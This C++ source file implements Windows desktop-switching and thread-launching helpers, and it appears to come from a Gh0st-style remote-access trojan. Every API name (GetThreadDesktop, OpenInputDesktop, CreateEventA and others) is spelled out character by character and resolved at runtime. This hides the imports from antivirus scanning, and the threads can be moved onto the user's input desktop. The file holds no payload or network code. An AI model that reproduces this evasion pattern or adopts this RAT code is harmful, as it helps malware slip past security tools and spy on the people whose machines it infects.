
#include "../stdafx.h"
#include "declare.h"
#include "utils.h"
#include "mystring.h"



BOOL SelectHDESK(HDESK new_desktop)
{
	char CPolQ17[] = { 'G','e','t','C','u','r','r','e','n','t','T','h','r','e','a','d','I','d','\0' };
	GetCurrentThreadIdT pGetCurrentThreadId = (GetCurrentThreadIdT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), CPolQ17);
	char DYrEN62[] = { 'G','e','t','T','h','r','e','a','d','D','e','s','k','t','o','p','\0' };
	GetThreadDesktopT pGetThreadDesktop = (GetThreadDesktopT)GetProcAddress(LoadLibrary(_T("USER32.dll")), DYrEN62);
	HDESK old_desktop = pGetThreadDesktop(pGetCurrentThreadId());

	DWORD dummy;
	char new_name[256];

	char DYrEN61[] = { 'G','e','t','U','s','e','r','O','b','j','e','c','t','I','n','f','o','r','m','a','t','i','o','n','A','\0' };
	GetUserObjectInformationAT pGetUserObjectInformationA = (GetUserObjectInformationAT)GetProcAddress(LoadLibrary(_T("USER32.dll")), DYrEN61);
	if (!pGetUserObjectInformationA(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}

	// Switch the desktop
	char DYrEN70[] = { 'S','e','t','T','h','r','e','a','d','D','e','s','k','t','o','p','\0' };
	SetThreadDesktopT pSetThreadDesktop = (SetThreadDesktopT)GetProcAddress(LoadLibrary(_T("USER32.dll")), DYrEN70);
	if (!pSetThreadDesktop(new_desktop)) {
		return FALSE;
	}

	// Switched successfully - destroy the old desktop
	char DYrEN69[] = { 'C','l','o','s','e','D','e','s','k','t','o','p','\0' };
	CloseDesktopT pCloseDesktop = (CloseDesktopT)GetProcAddress(LoadLibrary(_T("USER32.dll")), DYrEN69);
	pCloseDesktop(old_desktop);

	return TRUE;
}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.

BOOL SelectDesktop(char *name)
{
	HDESK desktop;

	char JtQBs06[] = { 'O','p','e','n','I','n','p','u','t','D','e','s','k','t','o','p','\0' };
	OpenInputDesktopT pOpenInputDesktop = (OpenInputDesktopT)GetProcAddress(LoadLibrary(_T("USER32.dll")), JtQBs06);

	char DYrEN63[] = { 'O','p','e','n','D','e','s','k','t','o','p','A','\0' };
	OpenDesktopAT pOpenDesktopA = (OpenDesktopAT)GetProcAddress(LoadLibrary(_T("USER32.dll")), DYrEN63);
	if (name != NULL)
	{
		// Attempt to open the named desktop
		/*		desktop = pOpenDesktopA(name, 0, FALSE,
		DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
		DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
		DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
		DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
		*/
		desktop = pOpenDesktopA(name, 0, FALSE,
			0x1FF);
	}
	else
	{
		// No, so open the input desktop
		/*		desktop = pOpenInputDesktop(0, FALSE,
		DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
		DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
		DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
		DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
		*/
		desktop = pOpenInputDesktop(1, FALSE,
			0x1FF);
	}

	// Did we succeed?
	if (desktop == NULL) {
		return FALSE;
	}

	// Switch to the new desktop
	char DYrEN69[] = { 'C','l','o','s','e','D','e','s','k','t','o','p','\0' };
	CloseDesktopT pCloseDesktop = (CloseDesktopT)GetProcAddress(LoadLibrary(_T("USER32.dll")), DYrEN69);
	if (!SelectHDESK(desktop)) {
		// Failed to enter the new desktop, so free it!
		pCloseDesktop(desktop);
		return FALSE;
	}

	// We successfully switched desktops!
	return TRUE;
}

////////////////////////////////////////////////////////////////////////////////////////////////
unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#ifdef _DLL
	try
	{
#endif	
		THREAD_ARGLIST	arg;
		my_memcpy(&arg, param, sizeof(arg));
		char BrmAP23[] = { 'S','e','t','E','v','e','n','t','\0' };
		SetEventT pSetEvent = (SetEventT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP23);
		pSetEvent(arg.hEventTransferArg);
		// Óë×ÀÃæ½»»¥
		if (arg.bInteractive)
			SelectDesktop(NULL);

		nRet = arg.start_address(arg.arglist);
#ifdef _DLL
	}
	catch (...) {};
#endif
	return nRet;
}

HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
	SIZE_T dwStackSize,                       // initial stack size
	LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
	LPVOID lpParameter,                       // thread argument
	DWORD dwCreationFlags,                    // creation option
	LPDWORD lpThreadId,
	bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned(__stdcall *)(void *))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	char BrmAP22[] = { 'C','r','e','a','t','e','E','v','e','n','t','A','\0' };
	CreateEventAT pCreateEventA = (CreateEventAT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP22);
	arg.hEventTransferArg = pCreateEventA(NULL, false, false, NULL);
	//	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);

	unsigned  uiThread1ID;
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, &uiThread1ID);
	char BrmAP30[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0' };
	WaitForSingleObjectT pWaitForSingleObject = (WaitForSingleObjectT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP30);
	pWaitForSingleObject(arg.hEventTransferArg, INFINITE);
	char BrmAP29[] = { 'C','l','o','s','e','H','a','n','d','l','e','\0' };
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP29);
	pCloseHandle(arg.hEventTransferArg);

	return hThread;
}


